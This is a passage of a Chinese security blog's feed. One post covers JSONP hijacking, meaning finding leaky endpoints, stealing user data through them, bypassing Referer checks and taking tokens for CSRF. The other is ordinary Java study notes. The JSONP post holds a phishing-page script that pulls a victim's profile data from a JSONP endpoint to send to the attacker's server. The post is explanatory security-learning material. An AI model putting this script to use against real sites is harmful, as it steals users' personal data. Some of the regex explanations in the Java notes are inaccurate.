class="string">&quot;test@test.com&quot;</span>&#125;)。</span><br></pre></td></tr></table></figure><p>6）网站B数据返回后，浏览器则自动执行Callback函数对步骤4返回的JSON格式数据进行处理，通过alert弹窗展示了用户在网站B的注册信息。另外也可将JSON数据回传到网站A的服务器，这样网站A利用网站B的JSONP漏洞便获取到了用户在网站B注册的信息。</p><p>可以看到jsonp劫持很像csrf，通过网站A窃取用户在网站B的信息。</p><h2 id="JSONP劫持漏洞挖掘："><a href="#JSONP劫持漏洞挖掘：" class="headerlink" title="JSONP劫持漏洞挖掘："></a>JSONP劫持漏洞挖掘：</h2><p>登录网站（不登录无法知道是否有敏感数据泄露），在chrome浏览器F12，把保留日志勾上。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212211101925.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212211101925.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221212211101925"></p><p>以freebuf为例（当然freebuf没有），在过滤窗口搜索callback、json、email等关键字，也可以手动找符合形式的请求</p><p>找到可疑的请求就拖到url访问一下看有没有关注的敏感信息。</p><p>如果存在，切换页面看是否能被不同的域请求到。</p><p>当然以上过程可以换位selenium+proxy代理实现，验证的话就剔除Referer字段再进行请求，不需要referer就能拿到敏感json，那就存在jsonp劫持漏洞</p><h2 id="json水坑攻击"><a href="#json水坑攻击" class="headerlink" title="json水坑攻击"></a>json水坑攻击</h2><p>所谓水坑攻击，也就是钓鱼and信息收集窃取数据，发现jsonp接口后制作一个钓鱼网站，其中包含自动请求jsonp接口的脚本，比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url: <span class="string">&#x27;jsonp漏洞接口&#x27;</span>,</span><br><span class="line">    type: <span class="string">&#x27;get&#x27;</span>,</span><br><span class="line">    dataType: <span class="string">&#x27;jsonp&#x27;</span>,</span><br><span class="line">&#125;).done(function(json)&#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">id</span> <span class="operator">=</span> json[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;id&quot;</span>];</span><br><span class="line">    <span class="type">var</span> <span class="variable">screen_name</span> <span class="operator">=</span> json[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;screen_name&quot;</span>];</span><br><span class="line">    <span class="type">var</span> <span class="variable">profile_image_url</span> <span class="operator">=</span> json[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;profile_image_url&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">var</span> <span class="variable">post_data</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    post_data += <span class="string">&quot;id=&quot;</span> + id + <span class="string">&quot;&amp;amp;&quot;</span>;</span><br><span class="line">    post_data += <span class="string">&quot;screen_name=&quot;</span> + screen_name + <span class="string">&quot;&amp;amp;&quot;</span>;</span><br><span class="line">    post_data += <span class="string">&quot;profile_image_url=&quot;</span> + encodeURIComponent(profile_image_url);</span><br><span class="line">    console.log(post_data);</span><br><span class="line">    <span class="comment">// 发送到我的服务器上</span></span><br><span class="line">&#125;).fail(function() &#123;&#125;);</span><br></pre></td></tr></table></figure><p>将目标的id,screen_name和profile_image_url发送到本地服务器。</p><h2 id="JSONP跨域劫持token"><a href="#JSONP跨域劫持token" class="headerlink" title="JSONP跨域劫持token"></a>JSONP跨域劫持token</h2><p>发起jsonp请求，获取token后进行csrf攻击</p><h2 id="Referer绕过"><a href="#Referer绕过" class="headerlink" title="Referer绕过"></a>Referer绕过</h2><ol><li><p>利用data URL构造无Referer请求。</p></li><li><p>HTTPS发送HTTP请求。目标网站可以通过HTTP访问时，HTTPS页面发起HTTP请求默认不发送Referer</p></li></ol><p>参考：<a href="https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/">https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/</a></p><p><a href="https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/">https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/</a></p>]]></content>
      
      
      <categories>
          
          <category> 溯源 </category>
          
          <category> JSONP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 溯源 </tag>
            
            <tag> JSONP </tag>
            
            <tag> 蜜罐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习笔记</title>
      <link href="/2022/05/10/java-xue-xi-bi-ji/"/>
      <url>/2022/05/10/java-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="java学习简记"><a href="#java学习简记" class="headerlink" title="java学习简记"></a>java学习简记</h1><p>学习CC链过程中发现java水平不够，本笔记主要介绍java我个人认为比较重要或者困难的地方。</p><h2 id="类定义"><a href="#类定义" class="headerlink" title="类定义"></a>类定义</h2><p>abstract声明抽象类和抽象方法（没有任何实现的类和方法），为了以后扩充。如果类有抽象方法，那该类也必须为抽象类</p><p>extends继承父类,implements定义接口</p><p>synchronized定义方法只能同时被一个线程访问</p><p>transient修饰变量，在序列化时忽略该变量</p><p>volatile修饰的成员变量在每次被线程访问时都要重读值，也就是两个线程访问到的都是同一值。同时也组织了编译器对该变量进行优化</p><p>Character传char参数会自动转换为Character对象，叫做装箱。装箱后数据类型为对象，可以使用对应的许多方法</p><p>String定义的字符串对象，定义后不可改变。改变的话需要用StringBuffer或者StringBuilder。String.format()添加格式化字符串（带参数的字符串）</p><p>处理数组时可以使用循环或者foreach循环。util.Arrays类也提供了赋值、排序、比较、查找等方法</p><ul><li><code>for(double element:List)&#123;&#125;</code>循环遍历List数组里的double类型元素，该元素在每次循环用element命名使用</li></ul><h2 id="正则匹配："><a href="#正则匹配：" class="headerlink" title="正则匹配："></a>正则匹配：</h2><ul><li>比如w3Cschool里的代码：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="string">&quot;This order was placed for QT3000! OK?&quot;</span>;</span><br><span class="line">      <span class="type">String</span> <span class="variable">pattern</span> <span class="operator">=</span> <span class="string">&quot;(.*)(\\d+)(.*)&quot;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 创建 Pattern 对象</span></span><br><span class="line">      <span class="type">Pattern</span> <span class="variable">r</span> <span class="operator">=</span> Pattern.compile(pattern);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 现在创建 matcher 对象</span></span><br><span class="line">      <span class="type">Matcher</span> <span class="variable">m</span> <span class="operator">=</span> r.matcher(line);</span><br><span class="line">      <span class="keyword">if</span> (m.find( )) &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;Found value: &quot;</span> + m.group(<span class="number">0</span>) );</span><br><span class="line">         System.out.println(<span class="string">&quot;Found value: &quot;</span> + m.group(<span class="number">1</span>) );</span><br><span class="line">         System.out.println(<span class="string">&quot;Found value: &quot;</span> + m.group(<span class="number">2</span>) );</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;NO MATCH&quot;</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>按照捕获组的思路，group(0)为<code>(.*)(\\d+)(.*)</code>，<code>(.*)</code>表示除了换行外的任意字符串。<code>\\</code>转义为<code>\</code>，<code>\d</code>匹配数字，<code>+</code>匹配以+前面开头的字符串，比如”zo+”匹配”zo”和”zoo”。</p><p>所以<code>(\\d)</code>匹配到的值为3000，<code>(\\d+)</code>匹配到的值为0，<code>(.*)(\\d+)(.*)</code>匹配到的值为QT3000! OK? 即group(0)的值</p><p>group(1)为<code>(.*)</code>，值为QT300</p><p>group(2)为<code>(\\d+)</code>，值为0</p><ul><li>start()返回匹配字符串的起始字符在整个被匹配字符串的位置，end()则是结束位置。count返回匹配成功的次数</li><li>除此以外还有matches整串匹配，lookingAt部分匹配。replaceFirst首次替换，replaceAll全部替换。appendReplacement正则替换，appendTail匹配完成的字符串返回给对象</li></ul><h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><ul><li>可变参数：<code>...</code>作最后一个参数时表示可接受多个参数</li><li>回收对象：<code>finalize()</code>指定对象销毁时执行的操作，要用protected限定以免被类外调用。销毁对象可以在类方法里调用<code>System.gc()</code>，该方法将回收它所定义的“垃圾”。finalize一般以<code>super.finalize()</code>的方式使用（超类终结器）</li></ul><h3 id="流"><a href="#流" class="headerlink" title="流"></a>流</h3><ul><li>控制台输入流：</li></ul><p><code>BufferedReader bi = new BufferedReader(new InputStreamReader(System.in));</code></p><p>将System.in包装在BufferReader对象中创建字符流。对字符流存在很多操作。比如read()方法读取输入的字符，或者用readLine()读取字符串（enter为数组下一索引），读取结束会返回IOException</p><ul><li>控制台输出流</li></ul><p><code>System.out.write(字符串or流)</code>输出流。System.out是PrintStream类对象的引用，PrintStream继承OutoutStream并实现了write()。所以该方法的作用和println()和print()一样。</p><ul><li>文件读取流</li></ul><p><code>InputStream f = new FileInputStream(&quot;文件路径&quot;)</code>也可以向字符串的位置填一个文件对象。创建输入流对象读取文件</p><ul><li>文件写入流</li></ul><p><code>OutputStream f = new FileOutputStream(&quot;文件路径&quot;)</code>写入内容，同理也能填文件对象</p><ul><li>Scanner数据输入</li></ul><p>控制台输入流操作起来不方便，可以用<code>Scanner scan = new Scanner(System.in)</code>接收数据，再使用Scanner类的方法。而next和next的方法细节请看<code>https://www.w3cschool.cn/java/java-scanner-class.html</code></p><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>学过python的话，我记得try…except…涉及异常处理，C++和PHP里则是try…catch…。都是try里的函数可能涉及异常，出现异常则throw一种Exception，catch到该类Exception进行处理。java也有使用try…catch进行异常处理的，只不过没有定义方法时进行异常处理常用。</p><p>java内置了异常类在java.lang包，所以可以直接使用。比如数组越界异常ArrayIndexOutOfBoundsException。异常类通常接在方法声明中，比如<code>public void a(double b) throws RemoteException&#123;&#125;</code>，throw异常类会自动捕捉并处理异常</p><ul><li>finally放在<code>try...catch...</code>的最后，是运行完<code>try...catch...</code>必定会处理的内容（不一定非要finally结尾)</li><li>自定义异常。<code>class AException extends Exception&#123;&#125;</code>，定义AException异常，同时可以重构其构造函数来对异常进行处理。</li></ul><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>所有类都是从java.lang.Object类继承来的，除了Object外所有类都必须有一个父类</p><ul><li><p>extends继承的子类有父类的所有成员变量，但是不能访问父类的private成员。子类可以重写父类的任何方法，但是通常必须满足：1.参数列表相同 2.返回类型是父类派生类 3.访问权限大于等于父类该方法 4.final、static不能被重写。等要求（菜鸟使用就完全一样的声明方式，别记）</p></li><li><p>instanceof检查A是否为B的子类</p></li><li><p>java不能同时继承多个类，但是可以同时实现多个接口</p></li></ul><p>子类调用父类<strong>被重写</strong>方法时用super，比如下列代码Dog就是调用了父类Animal的move。如果是构造函数，直接<code>super();</code>就能调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">move</span><span class="params">(<span class="type">double</span> a)</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;动物可以移动&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">move</span><span class="params">(<span class="type">double</span> a)</span>&#123;</span><br><span class="line">      <span class="built_in">super</span>.move(<span class="type">double</span> a); <span class="comment">// 应用super类的方法</span></span><br><span class="line">      System.out.println(<span class="string">&quot;狗可以跑和走&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>java所有对象都有多态性，比如<code>public class Deer extends Animal implements Vegetarian&#123;&#125;</code>就同时具有Animal、vegetarian、Deer、Object的性质。</p><p>这里都不用管，虚方法那些也不用学</p><h2 id="抽象类-amp-方法"><a href="#抽象类-amp-方法" class="headerlink" title="抽象类&amp;方法"></a>抽象类&amp;方法</h2><p>抽象类就是定义了类，但是没有实现。抽象类用abstract定义</p><p>因为没有实现，抽象类的实例化自然也没有意义。抽象类存在的意义就是让子类继承，并实现其中的部分or全部方法</p><blockquote><p>如果一个类包含抽象方法，该类必须是抽象类。而且子类继承时必须将抽象方法全部实现。否则子类为抽象类</p></blockquote><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>接口不能生成对象。继承接口的类必须实现接口内所有方法（不然就是抽象类），除此以外：</p><ol><li><p>接口没有构造方法</p></li><li><p>接口内所有方法都必须是抽象方法（接口隐式抽象，也就是声明方法不需要用abstract指定抽象方法，同理声明接口也一样)。接口方法都是公有</p></li><li><p>接口不能包含除static、final之外的成员变量</p></li></ol><p>用<code>public interface 接口名( extends 类)</code>的方式声明接口。</p><p>用<code>public class 类名 implements 接口名[,...多个接口]</code>的方式实现接口。</p><blockquote><p>实现接口时不能抛出强制性异常，只能在父类或者父接口中抛出该强制性异常</p></blockquote><p>接口的继承也使用extends，同理在实现接口时需要实现该接口及其父类接口的全部方法。</p><h2 id="package包"><a href="#package包" class="headerlink" title="package包"></a>package包</h2><p>比如下列代码的路径就是org.example.A.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>同样，有一个代码是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>那么在使用的时候import org.example.*;或者import org.example.A;import org.example.B;就能同时使用A、B两个类</p><p>正因通过路径使用包的方式，A、B就必须存放在工作目录的org&#x2F;example目录下</p><h2 id="java数据结构"><a href="#java数据结构" class="headerlink" title="java数据结构"></a>java数据结构</h2><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>Enumeration 定义枚举数据。其实枚举就像一个一次性数组。比如w3school给出的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">      Enumeration days;</span><br><span class="line">      <span class="type">Vector</span> <span class="variable">dayNames</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vector</span>();</span><br><span class="line">      dayNames.add(<span class="string">&quot;Monday&quot;</span>);</span><br><span class="line">      dayNames.add(<span class="string">&quot;Tuesday&quot;</span>);</span><br><span class="line">      dayNames.add(<span class="string">&quot;Wednesday&quot;</span>);</span><br><span class="line">      dayNames.add(<span class="string">&quot;Thursday&quot;</span>);</span><br><span class="line">      dayNames.add(<span class="string">&quot;Friday&quot;</span>);</span><br><span class="line">      days = dayNames.elements();</span><br><span class="line">      <span class="keyword">while</span> (days.hasMoreElements())&#123;</span><br><span class="line">         System.out.println(days.nextElement()); </span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用Vector容器动态存放字符串数组。用element返回vector中元素枚举（队列形式，不知道队列和栈的转战数据结构）</p><p>hasMoreElements判断容器中还有无枚举。nextElement()返回下一个枚举元素</p><h3 id="位集合-Bitset"><a href="#位集合-Bitset" class="headerlink" title="位集合(Bitset)"></a>位集合(Bitset)</h3><p>关于C++bitset可以去看我的sha256算法的bitset实现<a href="https://blog.csdn.net/qq_51796436/article/details/124999060?spm=1001.2014.3001.5502%E3%80%82%E5%85%B6%E5%AE%9Ebitset%E5%B0%B1%E6%98%AF%E4%B8%80%E4%B8%AAbool%E6%95%B0%E7%BB%84%EF%BC%8C%E5%8F%AA%E4%B8%8D%E8%BF%87%E5%AF%B9bool%E5%80%BC%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%81%9A%E4%BA%86%E5%BE%88%E5%A4%9A%E4%BC%98%E5%8C%96">https://blog.csdn.net/qq_51796436/article/details/124999060?spm=1001.2014.3001.5502。其实bitset就是一个bool数组，只不过对bool值的实现做了很多优化</a></p><h3 id="向量-vector容器"><a href="#向量-vector容器" class="headerlink" title="向量(vector容器)"></a>向量(vector容器)</h3><p>动态数组。和ArrayList的主要区别是vector包含了很多不属于集合框架的方法。用new的方式新建容器，用调用方法的方式使用容器，比如有以下常用的方法：</p><ul><li>elements()返回容器枚举</li><li>hashCode()返回向量哈希码</li><li>toString()返回向量的字符串形式（每个元素的String）</li></ul><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>后进先出。是vector的子类，所以能使用vector的方法。定义方式和vector容器一样:</p><p><code>Stack a = new Stack();</code></p><p>push(a)压栈，pop()出栈，peek()查看栈顶部但不进行出栈操作</p><h3 id="哈希表-amp-HashMap（关键）"><a href="#哈希表-amp-HashMap（关键）" class="headerlink" title="哈希表&amp;HashMap（关键）"></a>哈希表&amp;HashMap（关键）</h3><p>Hashtable和HashMap一样，只是Hashtable支持同步。可以理解为javascript语言的命名索引。用key-value的方式组成数组，一个key对应一个value。</p><h3 id="属性（Properties接口）"><a href="#属性（Properties接口）" class="headerlink" title="属性（Properties接口）"></a>属性（Properties接口）</h3><p>Properties继承于Hashtable，只不过key-value都是字符串</p><h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><p>所谓泛型也就是同时指代了多个数据类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt; E &gt; <span class="keyword">void</span> <span class="title function_">printArray</span><span class="params">( E[] inputArray )</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="comment">// 输出数组元素            </span></span><br><span class="line">         <span class="keyword">for</span> ( E element : inputArray )&#123;        </span><br><span class="line">            System.out.printf( <span class="string">&quot;%s &quot;</span>, element );</span><br><span class="line">         &#125;</span><br><span class="line">         System.out.println();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上述代码定义了一个函数输出数组元素，泛型参数的声明为<code>&lt;E&gt;</code>,E[]就指代了任意类型的数组。因为通常泛型的返回值也是泛型，所以声明方法时也就进行泛型声明。</p><p>再看一个泛型方法的定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;T&gt;&gt; T <span class="title function_">maximum</span><span class="params">(T x, T y, T z)</span></span><br><span class="line">   </span><br></pre></td></tr></table></figure><p>用extends继承的方式定义上界，那什么是上界呢？</p><p>在数学上来看，泛型就意味着定义域R。但一般来说接收的参数可能只要数字number或者正数域这些相对狭窄的域，就需要一个上界缩小需要值的范围</p><p>上述定义规定了泛型T 上界为<code>Comparable&lt;T&gt;</code>。查看Compareable的源码可以看到该接口接收参数也为泛型。<code>&lt;T extends Comparable&lt;T&gt;&gt;</code>定义完泛型T后要紧接一个T，没定义不用接</p><p>有泛型方法就有泛型类，泛型类的定义和使用如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Box</span>&lt;T&gt; &#123;&#125;<span class="comment">//定义</span></span><br><span class="line">Box&lt;String&gt; stringBox = <span class="keyword">new</span> <span class="title class_">Box</span>&lt;String&gt;();<span class="comment">//main中的使用</span></span><br></pre></td></tr></table></figure><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>序列化的目的就是方便存取。</p><p>序列化一般是writeObject，反序列化一般是readObject。</p><ul><li>可以序列化的类必须满足：<strong>必须实现了java.io.Serializable对象</strong></li></ul><p>序列化只需要以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;类路径&quot;</span>);</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);</span><br><span class="line">out.writeObject(e);</span><br><span class="line">out.close();</span><br><span class="line">fileOut.close();</span><br></pre></td></tr></table></figure><p>将文件流写入FileOutputStream流，然后将FileOutputStream写入到对象流ObjectOutputStream中，然后进行序列化</p><p>同理，反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;类路径&quot;</span>);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);</span><br><span class="line">e = (Employee) in.readObject();</span><br><span class="line">in.close();</span><br><span class="line">fileIn.close();</span><br></pre></td></tr></table></figure><p>需要用(Employee)指定入口类。这样序列化e就成了类引用</p><h2 id="java网络编程"><a href="#java网络编程" class="headerlink" title="java网络编程"></a>java网络编程</h2><p>一想起网络编程这四个字就应该想起套接字，也就是ip:port的形式。直接来看一个最简化的客户端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件名 GreetingClient.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreetingClient</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String [] args)</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">serverName</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">      <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="type">Socket</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(serverip, port);</span><br><span class="line">         <span class="type">OutputStream</span> <span class="variable">outToServer</span> <span class="operator">=</span> client.getOutputStream();</span><br><span class="line">         <span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(outToServer);</span><br><span class="line"> out.writeUTF(<span class="string">&quot;Hello from &quot;</span>+ client.getLocalSocketAddress());</span><br><span class="line">         <span class="type">InputStream</span> <span class="variable">inFromServer</span> <span class="operator">=</span> client.getInputStream();</span><br><span class="line">         <span class="type">DataInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(inFromServer);</span><br><span class="line">         System.out.println(<span class="string">&quot;Server says &quot;</span> + in.readUTF());</span><br><span class="line">         client.close();</span><br><span class="line">      &#125;<span class="keyword">catch</span>(IOException e)</span><br><span class="line">      &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义一个socket对象。</p><p>getOutputStream()即接收来自服务端的数据，并转化为OutputStream流写入到DataOutputStream，再调用方法输出</p><p>getInputStream输入消息，创建数据对象DataInputStream，并把要发送的消息写入到数据流。</p><p>服务端同理。只不过用serverSocket.accept()接收套接字连接请求</p><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>java实现多线程有三种方式</p><ol><li>继承Runnable接口（<code>implements Runnable</code>)</li><li>继承Thread类（<code>extends Thread</code>)</li><li>Callable和Future结合使用，并实现call()方法</li></ol><p>通过<code>new 线程()</code>的方式在main函数创建新线程。定义线程的同时需要重写构造函数。</p><ul><li>线程本身为主线程，start会生成子线程;一个start开启一个子线程，子线程会默认执行一遍run()</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NewThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">   NewThread() &#123;</span><br><span class="line">      <span class="comment">// 创建第二个新线程</span></span><br><span class="line">      start(); <span class="comment">// 开始线程</span></span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>前面两个都要重写run()方法作为线程执行的主体（Runnable非必要）。</p><h2 id="其他内容"><a href="#其他内容" class="headerlink" title="其他内容"></a>其他内容</h2><p>java的编译器一般下Intellij IDEA（专业版，非专业版没有很多后续学习需要的东西）。</p><p>java可能会需要很多版本，比如jdk8u65\jdk8u111\jdk8u200以上等，可以同时存放在一个目录，需要用到的时候在IDEA项目结构里切换SDK</p><p>java8版本也叫1.8</p><p>装完java发现你的burpsuite 、菜刀等工具崩了，改回以前的环境吧。环境变量改一下就行</p><p>moven只是一种管理工具</p><p>IDEA双击shift查找类or方法</p><p>修改依赖通常只需要在pom.xml修改dependency然后右键-&gt;moven-&gt;重新加载就行</p><p>想学习java web安全的可以在先知社区看看我的java反射&amp;Common-collections1&amp;6。链接如下：后续应该会写很多java web</p><p><a href="https://xz.aliyun.com/t/11861#toc-7">https://xz.aliyun.com/t/11861#toc-7</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> java杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java杂论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
